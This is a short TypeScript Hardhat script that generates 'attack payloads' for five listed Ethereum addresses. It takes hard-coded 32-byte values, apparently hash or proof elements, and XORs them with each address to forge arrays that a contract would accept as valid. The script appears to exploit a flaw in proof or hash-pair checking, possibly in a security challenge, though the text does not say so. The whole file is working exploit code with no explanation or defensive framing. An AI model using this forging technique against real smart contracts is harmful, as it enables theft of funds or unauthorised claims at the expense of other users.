import { ethers } from "hardhat";

const VALID_PAYLOAD: string[] = [
  "0x88888888888888888888888889271efd9789278334721f58f722ddc5c8ee8e3df",
  "0x8888888888888888888888888c54e1e97eebbccdc956a689bdda3e7da52318eb5b",
  "0xc2575a8e9e593c88f959f8c92f12db2869c3395a3b8582d85e2516446f71f85b",
  "0xd8dcdec7911e58baa5814dd82981613186eef885e5f531dc82615898d6dfeaf2",
];

const getNewPayload = (address: string): string[] => {
  const NEW_ELEMENT0 = ethers.utils.hexZeroPad(address, 32);
  const VALID_PAIR_HASH = ethers.utils.hexZeroPad(
    ethers.utils.hexlify(
      ethers.BigNumber.from(VALID_PAYLOAD[2]).xor(VALID_PAYLOAD[1])
    ),
    32
  );
  const NEW_ELEMENT1 = ethers.utils.hexZeroPad(
    ethers.utils.hexlify(
      ethers.BigNumber.from(NEW_ELEMENT0).xor(VALID_PAIR_HASH)
    ),
    32
  );

  return [NEW_ELEMENT0, NEW_ELEMENT1, ...VALID_PAYLOAD.slice(2)];
};

const main = () => {
  const ATTACK_ADDRESSES = [
    "0x53b50d95992F7C197bCe8a9Dc92546CD83B39a98",
    "0x9396Ee1b8bfC4D3c9f868FF5Aa77f34376246C63",
    "0xfB5d7FFAAc843E93532BF637fAdd4d3D21BDC163",
    "0x9Ec247e37EE1423eC548951c67ccEcf76EbAa213",
    "0x4b4aC99CDC8333728D41828a9a8eFC3324A98248",
  ];

  for (const address of ATTACK_ADDRESSES) {
    const PAYLOAD = getNewPayload(address);
    console.log(`Attack payload for ${address} is: [${PAYLOAD}]\n`);
  }
};

main();
